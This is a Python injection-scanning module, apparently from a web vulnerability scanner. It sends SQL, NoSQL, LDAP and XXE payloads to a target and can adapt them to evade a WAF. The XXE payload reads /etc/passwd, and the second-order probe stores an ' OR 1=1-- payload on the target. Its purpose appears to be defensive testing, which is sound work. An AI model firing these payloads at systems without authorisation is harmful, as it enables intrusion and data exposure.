from __future__ import annotations

import asyncio
import time

from ..core.encoding import encode_payloads, encode_tuple_payloads
from ..core.models import Finding, Severity
from ..core.waf_detect import detect_waf, waf_adapt_payload

# Error-based SQL injection signatures (specific SQL error messages)
ERROR_SIGNATURES = [
    "sql syntax", "mysql", "postgres", "sqlite", "ora-", "unclosed quotation mark",
    "quoted string not properly terminated", "odbc", "jdbc", "syntax error",
    "microsoft sql", "sql server", "pg_query", "psql", "warning: mysql",
    "valid mysql result", "mysql_fetch", "num_rows", "mysql_result",
    "division by zero", "supplied argument is not a valid", "on mysql result",
    "sqlite3::", "pdoexception", "sqlstate", "syntax error at or near",
]

# Boolean-based blind payloads: (true_payload, false_payload)
BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("1 AND 1=1", "1 AND 1=2"),
]

# Time-based blind payloads with expected delay
TIME_PAYLOADS = [
    ("' AND SLEEP(3)--", 3),
    ("' OR SLEEP(3)--", 3),
    ("1; WAITFOR DELAY '0:0:3'--", 3),
    ("' AND (SELECT * FROM (SELECT SLEEP(3))a)--", 3),
    ("' OR pg_sleep(3)--", 3),
]

# Union-based payloads
UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
]

# Error-based payloads
ERROR_PAYLOADS = ["'", "\"", "1'", "1\"", "';", '";']

# NoSQL injection payloads (MongoDB)
NOSQL_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$regex": ".*"}',
    '{"$where": "1==1"}',
    '{"$exists": true}',
    "admin' || '1'=='1",
    "' || '1'=='1",
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
]

# Common parameters to test
PARAMS = [
    "id", "q", "search", "page", "user", "name", "email", "username",
    "password", "token", "category", "product", "item", "order", "sort",
    "filter", "type", "action", "view", "lang", "query", "keyword", "term",
    "text", "message", "comment", "title", "content", "body", "data",
    "value", "key", "code", "ref", "redirect", "url", "path", "file",
    "from", "to", "date", "year", "month", "limit", "offset", "start",
    "end", "per_page", "size", "count", "num", "no", "number",
]

# Minimum response size difference to consider a boolean-based finding
MIN_DIFF_BYTES = 100


async def _get_baseline_timing(ctx, base: str, param: str) -> tuple[float, float]:
    """Measure normal response time with benign input. Returns (median, stddev)."""
    times = []
    for _ in range(5):
        if not ctx.can_request():
            return (0.0, 0.0)
        ctx.increment()
        start = time.monotonic()
        await ctx.http.get(base, params={param: "1"}, timeout=ctx.settings.timeout)
        elapsed = time.monotonic() - start
        times.append(elapsed)
    times.sort()
    median = times[2]  # median of 5
    # Calculate standard deviation
    mean = sum(times) / len(times)
    variance = sum((t - mean) ** 2 for t in times) / len(times)
    stddev = variance ** 0.5
    return (median, stddev)


async def _probe_error_based(ctx, base: str, param: str) -> bool:
    """Error-based SQL injection detection."""
    found = False
    encoding = getattr(ctx.settings, "payload_encoding", "none")
    payloads = encode_payloads(ERROR_PAYLOADS, encoding)
    if getattr(ctx.settings, "waf_adapt", False) and getattr(ctx, "waf_type", None):
        adapted = []
        for p in payloads:
            adapted.extend(waf_adapt_payload(p, ctx.waf_type))
        # Deduplicate
        seen = set()
        payloads = [p for p in adapted if not (p in seen or seen.add(p))]
    for payload in payloads:
        if not ctx.can_request():
            return found
        ctx.increment()
        baseline_resp = await ctx.http.get(base, params={param: "1"}, timeout=ctx.settings.timeout)
        baseline_body = (baseline_resp.text or "").lower()
        if not ctx.can_request():
            return found
        ctx.increment()
        resp = await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout)
        body = (resp.text or "").lower()
        new_errors = [sig for sig in ERROR_SIGNATURES if sig in body and sig not in baseline_body]
        if new_errors:
            # Verify: send the same payload again — should produce the same error
            if not ctx.can_request():
                return found
            ctx.increment()
            verify_resp = await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout)
            verify_body = (verify_resp.text or "").lower()
            if any(sig in verify_body for sig in new_errors):
                ctx.add_finding(Finding(
                    id=f"sqli-error-{param}",
                    title=f"Potential SQL injection (error-based) via '{param}'",
                    severity=Severity.HIGH,
                    confidence=0.85,
                    asset=f"{base}?{param}={payload}",
                    module="injection",
                    description=f"SQL error signature ({new_errors[0]}) detected in response.",
                    remediation="Use parameterized queries and input validation.",
                    tags=["sqli", "injection", "error-based"],
                ))
                found = True
                break
    return found


async def _probe_boolean_based(ctx, base: str, param: str) -> bool:
    """Boolean-based blind SQL injection detection with canary verification."""
    found = False
    encoding = getattr(ctx.settings, "payload_encoding", "none")
    bool_payloads = encode_tuple_payloads(BOOLEAN_PAYLOADS, encoding)
    for true_p, false_p in bool_payloads:
        if not ctx.can_request():
            return found
        # True condition
        ctx.increment()
        true_resp = await ctx.http.get(base, params={param: true_p}, timeout=ctx.settings.timeout)
        true_body = true_resp.text or ""
        true_status = true_resp.status_code
        true_len = len(true_body)
        # False condition
        if not ctx.can_request():
            return found
        ctx.increment()
        false_resp = await ctx.http.get(base, params={param: false_p}, timeout=ctx.settings.timeout)
        false_body = false_resp.text or ""
        false_status = false_resp.status_code
        false_len = len(false_body)
        # Must have same status code and significant size difference
        if true_status != false_status or true_len == 0:
            continue
        if true_body == false_body:
            continue
        if abs(true_len - false_len) < MIN_DIFF_BYTES:
            continue
        # Canary check: send true payload again — must produce identical response
        if not ctx.can_request():
            return found
        ctx.increment()
        canary_resp = await ctx.http.get(base, params={param: true_p}, timeout=ctx.settings.timeout)
        if canary_resp.text != true_body:
            continue  # Non-deterministic response, skip
        # Second canary with false payload
        if not ctx.can_request():
            return found
        ctx.increment()
        canary_false = await ctx.http.get(base, params={param: false_p}, timeout=ctx.settings.timeout)
        if canary_false.text != false_body:
            continue  # Non-deterministic response, skip
        ctx.add_finding(Finding(
            id=f"sqli-boolean-{param}",
            title=f"Potential SQL injection (boolean-based blind) via '{param}'",
            severity=Severity.HIGH,
            confidence=0.7,
            asset=f"{base}?{param}={true_p}",
            module="injection",
            description="Response differs between true and false conditions (verified with canary).",
            remediation="Use parameterized queries and input validation.",
            tags=["sqli", "injection", "blind", "boolean"],
        ))
        found = True
        break
    return found


async def _probe_time_based(ctx, base: str, param: str) -> bool:
    """Time-based blind SQL injection detection with baseline timing."""
    # Establish baseline timing first
    baseline, stddev = await _get_baseline_timing(ctx, base, param)
    # Skip if server is already slow or timing is inconsistent (unreliable)
    if baseline > 1.0 or stddev > 0.5:
        return False

    found = False
    encoding = getattr(ctx.settings, "payload_encoding", "none")
    time_payloads = encode_tuple_payloads(TIME_PAYLOADS, encoding)
    for payload, delay in time_payloads:
        if not ctx.can_request():
            return found
        ctx.increment()
        start = time.monotonic()
        resp = await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout + delay + 2)
        elapsed = time.monotonic() - start
        # Only flag if delay exceeds baseline + delay with 2x stddev tolerance
        threshold = baseline + delay + (2 * stddev)
        if elapsed >= threshold and resp.status_code != 0:
            # Verify: send normal request to confirm server isn't just slow
            if not ctx.can_request():
                return found
            ctx.increment()
            start2 = time.monotonic()
            await ctx.http.get(base, params={param: "1"}, timeout=ctx.settings.timeout)
            elapsed2 = time.monotonic() - start2
            # Require the payload to be significantly slower than the verification
            if elapsed - elapsed2 >= delay - 0.5:
                # Second verification: send payload again
                if not ctx.can_request():
                    return found
                ctx.increment()
                start3 = time.monotonic()
                await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout + delay + 2)
                elapsed3 = time.monotonic() - start3
                if elapsed3 >= threshold - 0.5:
                    ctx.add_finding(Finding(
                        id=f"sqli-time-{param}",
                        title=f"Potential SQL injection (time-based blind) via '{param}'",
                        severity=Severity.HIGH,
                        confidence=0.75,
                        asset=f"{base}?{param}={payload}",
                        module="injection",
                        description=f"Response delayed by {elapsed:.1f}s (baseline {baseline:.1f}s, expected ~{delay}s).",
                        remediation="Use parameterized queries and input validation.",
                        tags=["sqli", "injection", "blind", "time-based"],
                    ))
                    found = True
                    break
    return found


async def _probe_union_based(ctx, base: str, param: str) -> bool:
    """Union-based SQL injection detection with verification."""
    found = False
    encoding = getattr(ctx.settings, "payload_encoding", "none")
    union_payloads = encode_payloads(UNION_PAYLOADS, encoding)
    for payload in union_payloads:
        if not ctx.can_request():
            return found
        ctx.increment()
        baseline_resp = await ctx.http.get(base, params={param: "1"}, timeout=ctx.settings.timeout)
        baseline_body = (baseline_resp.text or "").lower()
        baseline_len = len(baseline_body)
        if not ctx.can_request():
            return found
        ctx.increment()
        resp = await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout)
        body = (resp.text or "").lower()
        body_len = len(body)
        # Require: 200 status, significant size increase, no SQL error in response
        if (resp.status_code == 200 and body != baseline_body
                and body_len > baseline_len + 50
                and "union" not in body and "error" not in body
                and "sql" not in body):
            # Verify: send payload again — should produce same result
            if not ctx.can_request():
                return found
            ctx.increment()
            verify_resp = await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout)
            if verify_resp.text == resp.text:
                ctx.add_finding(Finding(
                    id=f"sqli-union-{param}",
                    title=f"Potential SQL injection (union-based) via '{param}'",
                    severity=Severity.HIGH,
                    confidence=0.65,
                    asset=f"{base}?{param}={payload}",
                    module="injection",
                    description="Response changed with UNION payload (verified), suggesting union-based SQLi.",
                    remediation="Use parameterized queries and input validation.",
                    tags=["sqli", "injection", "union"],
                ))
                found = True
                break
    return found


async def _probe_param(ctx, base: str, param: str) -> None:
    """Run all SQLi detection techniques on a parameter."""
    # Try error-based first (fastest, most reliable)
    if await _probe_error_based(ctx, base, param):
        return
    # Boolean-based blind
    if await _probe_boolean_based(ctx, base, param):
        return
    # Time-based blind (slower, use sparingly)
    if await _probe_time_based(ctx, base, param):
        return
    # Union-based
    await _probe_union_based(ctx, base, param)


async def _probe_nosql(ctx, base: str, param: str) -> bool:
    """NoSQL injection detection."""
    found = False
    for payload in NOSQL_PAYLOADS:
        if not ctx.can_request():
            return found
        ctx.increment()
        baseline_resp = await ctx.http.get(base, params={param: "test"}, timeout=ctx.settings.timeout)
        baseline_body = (baseline_resp.text or "").lower()
        baseline_len = len(baseline_body)
        if not ctx.can_request():
            return found
        ctx.increment()
        resp = await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout)
        body = (resp.text or "").lower()
        body_len = len(body)
        # NoSQL injection often returns more data or different structure
        if (resp.status_code == 200 and body != baseline_body
                and body_len > baseline_len + 50
                and resp.status_code == baseline_resp.status_code):
            # Verify
            if not ctx.can_request():
                return found
            ctx.increment()
            verify_resp = await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout)
            if verify_resp.text == resp.text:
                ctx.add_finding(Finding(
                    id=f"nosqli-{param}",
                    title=f"Potential NoSQL injection via '{param}'",
                    severity=Severity.HIGH,
                    confidence=0.7,
                    asset=f"{base}?{param}={payload}",
                    module="injection",
                    description="Response changed with NoSQL operator payload, suggesting NoSQL injection.",
                    remediation="Use parameterized queries and input validation for NoSQL databases.",
                    tags=["nosqli", "injection", "mongodb"],
                ))
                found = True
                break
    return found


async def _probe_header_sqli(ctx, base: str) -> bool:
    """SQL injection via HTTP headers (User-Agent, Referer, X-Forwarded-For)."""
    found = False
    headers_to_test = ["User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP", "Cookie"]
    for header in headers_to_test:
        for payload in ERROR_PAYLOADS[:3]:
            if not ctx.can_request():
                return found
            ctx.increment()
            baseline_resp = await ctx.http.get(base, timeout=ctx.settings.timeout)
            baseline_body = (baseline_resp.text or "").lower()
            if not ctx.can_request():
                return found
            ctx.increment()
            resp = await ctx.http.get(base, headers={header: payload}, timeout=ctx.settings.timeout)
            body = (resp.text or "").lower()
            new_errors = [sig for sig in ERROR_SIGNATURES if sig in body and sig not in baseline_body]
            if new_errors:
                ctx.add_finding(Finding(
                    id=f"sqli-header-{header.lower().replace('-', '_')}",
                    title=f"Potential SQL injection via '{header}' header",
                    severity=Severity.HIGH,
                    confidence=0.75,
                    asset=base,
                    module="injection",
                    description=f"SQL error signature ({new_errors[0]}) detected when injecting via {header} header.",
                    remediation="Use parameterized queries. Do not interpolate HTTP headers into SQL.",
                    tags=["sqli", "injection", "header-based"],
                ))
                found = True
                break
        if found:
            break
    return found


async def run(ctx) -> None:
    base = f"https://{ctx.target}"
    # Detect WAF on first request
    try:
        resp = await ctx.http.get(base, timeout=ctx.settings.timeout)
        ctx.waf_type = detect_waf(resp.headers, resp.text)
    except Exception:
        ctx.waf_type = None

    # Header-based SQLi
    await _probe_header_sqli(ctx, base)

    # Cookie-based SQLi
    await _probe_cookie_sqli(ctx, base)

    # LDAP injection (on search/filter params)
    ldap_params = ["search", "filter", "query", "q", "name", "user"]
    ldap_tasks = [_probe_ldap(ctx, base, param) for param in ldap_params if param in PARAMS]
    await asyncio.gather(*ldap_tasks, return_exceptions=True)

    # XML/XXE injection
    await _probe_xml(ctx, base)

    tasks = [_probe_param(ctx, base, param) for param in PARAMS]
    await asyncio.gather(*tasks, return_exceptions=True)

    # NoSQL injection (run on a subset of params to save requests)
    nosql_params = ["username", "email", "user", "password", "name", "search", "q"]
    nosql_tasks = [_probe_nosql(ctx, base, param) for param in nosql_params if param in PARAMS]
    await asyncio.gather(*nosql_tasks, return_exceptions=True)

    # Second-order SQLi: store payload in one param, check if it executes in another
    await _probe_json_body(ctx, base)

    await _probe_second_order(ctx, base)


async def _probe_second_order(ctx, base: str) -> None:
    """Second-order SQL injection: store payload, then trigger via another request."""
    store_params = ["name", "username", "comment", "title", "message"]
    trigger_paths = ["/profile", "/account", "/dashboard", "/view", "/search"]
    payload = "' OR 1=1--"
    for store_param in store_params:
        if not ctx.can_request():
            return
        # Store the payload
        ctx.increment()
        store_resp = await ctx.http.post(f"{base}/", data={store_param: payload}, timeout=ctx.settings.timeout)
        if store_resp.status_code not in (200, 302, 303):
            continue
        # Trigger: fetch a page that might use the stored value
        for trigger_path in trigger_paths:
            if not ctx.can_request():
                return
            ctx.increment()
            trigger_resp = await ctx.http.get(f"{base}{trigger_path}", timeout=ctx.settings.timeout)
            body = (trigger_resp.text or "").lower()
            # Check for SQL error signatures in the triggered response
            if any(sig in body for sig in ERROR_SIGNATURES):
                ctx.add_finding(Finding(
                    id=f"sqli-second-order-{store_param}",
                    title=f"Potential second-order SQL injection via '{store_param}'",
                    severity=Severity.HIGH,
                    confidence=0.6,
                    asset=f"{base}/",
                    module="injection",
                    description=f"SQL error detected after storing payload in '{store_param}' and visiting {trigger_path}.",
                    remediation="Use parameterized queries. Sanitize stored input before use in queries.",
                    tags=["sqli", "injection", "second-order"],
                ))
                return

async def _probe_json_body(ctx, base):
    json_endpoints = ["/api/login", "/api/search", "/api/query", "/api/data", "/search", "/query"]
    for endpoint in json_endpoints:
        if not ctx.can_request():
            return
        for payload in ERROR_PAYLOADS[:3]:
            if not ctx.can_request():
                return
            ctx.increment()
            baseline_resp = await ctx.http.post(
                base + endpoint,
                json={"query": "test", "search": "test", "id": "1"},
                timeout=ctx.settings.timeout,
            )
            baseline_body = (baseline_resp.text or "").lower()
            if not ctx.can_request():
                return
            ctx.increment()
            resp = await ctx.http.post(
                base + endpoint,
                json={"query": payload, "search": payload, "id": payload},
                timeout=ctx.settings.timeout,
            )
            body = (resp.text or "").lower()
            new_errors = [sig for sig in ERROR_SIGNATURES if sig in body and sig not in baseline_body]
            if new_errors:
                safe_id = endpoint.strip("/").replace("/", "-")
                ctx.add_finding(Finding(
                    id="sqli-json-" + safe_id,
                    title="Potential SQL injection via JSON body on " + endpoint,
                    severity=Severity.HIGH,
                    confidence=0.8,
                    asset=base + endpoint,
                    module="injection",
                    description="SQL error signature (" + new_errors[0] + ") detected in JSON response.",
                    remediation="Use parameterized queries. Validate JSON input.",
                    tags=["sqli", "injection", "json"],
                ))
                return

LDAP_PAYLOADS = ["*", ")(uid=*)", "admin*", ")(cn=*)", "*) (|(uid=*", "admin)(|(password=*)"]

async def _probe_ldap(ctx, base, param):
    found = False
    for payload in LDAP_PAYLOADS:
        if not ctx.can_request():
            return found
        ctx.increment()
        baseline_resp = await ctx.http.get(base, params={param: "test"}, timeout=ctx.settings.timeout)
        baseline_body = (baseline_resp.text or "").lower()
        if not ctx.can_request():
            return found
        ctx.increment()
        resp = await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout)
        body = (resp.text or "").lower()
        ldap_errors = ["ldap", "invalid dn", "search filter", "ldap_search", "ldap_bind"]
        new_errors = [sig for sig in ldap_errors if sig in body and sig not in baseline_body]
        if new_errors:
            ctx.add_finding(Finding(
                id="ldap-injection-" + param,
                title="Potential LDAP injection via " + param,
                severity=Severity.HIGH,
                confidence=0.7,
                asset=base + "?" + param + "=" + payload,
                module="injection",
                description="LDAP error signature detected in response.",
                remediation="Use parameterized LDAP queries and input validation.",
                tags=["ldap", "injection"],
            ))
            found = True
            break
    return found

XML_PAYLOADS = ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', '<?xml version="1.0"?><foo>test</foo>']

async def _probe_xml(ctx, base):
    xml_endpoints = ["/api/xml", "/api/soap", "/xml", "/soap", "/ws"]
    for endpoint in xml_endpoints:
        if not ctx.can_request():
            return
        for payload in XML_PAYLOADS:
            if not ctx.can_request():
                return
            ctx.increment()
            resp = await ctx.http.post(
                base + endpoint,
                data=payload,
                headers={"Content-Type": "application/xml"},
                timeout=ctx.settings.timeout,
            )
            body = (resp.text or "").lower()
            if "root:x:" in body or "daemon:" in body:
                ctx.add_finding(Finding(
                    id="xxe-" + endpoint.strip("/").replace("/", "-"),
                    title="Potential XXE via " + endpoint,
                    severity=Severity.CRITICAL,
                    confidence=0.9,
                    asset=base + endpoint,
                    module="injection",
                    description="XML external entity injection detected.",
                    remediation="Disable external entity processing in XML parser.",
                    tags=["xxe", "injection", "xml"],
                ))
                return
async def _probe_cookie_sqli(ctx, base):
    for payload in ERROR_PAYLOADS[:3]:
        if not ctx.can_request():
            return
        ctx.increment()
        baseline_resp = await ctx.http.get(base, timeout=ctx.settings.timeout)
        baseline_body = (baseline_resp.text or '').lower()
        if not ctx.can_request():
            return
        ctx.increment()
        resp = await ctx.http.get(base, headers={'Cookie': 'session=' + payload}, timeout=ctx.settings.timeout)
        body = (resp.text or '').lower()
        new_errors = [sig for sig in ERROR_SIGNATURES if sig in body and sig not in baseline_body]
        if new_errors:
            ctx.add_finding(Finding(
                id='sqli-cookie',
                title='Potential SQL injection via Cookie header',
                severity=Severity.HIGH,
                confidence=0.75,
                asset=base,
                module='injection',
                description=f'SQL error signature ({new_errors[0]}) detected via Cookie injection.',
                remediation='Use parameterized queries. Do not interpolate cookies into SQL.',
                tags=['sqli', 'injection', 'cookie-based'],
            ))
            return
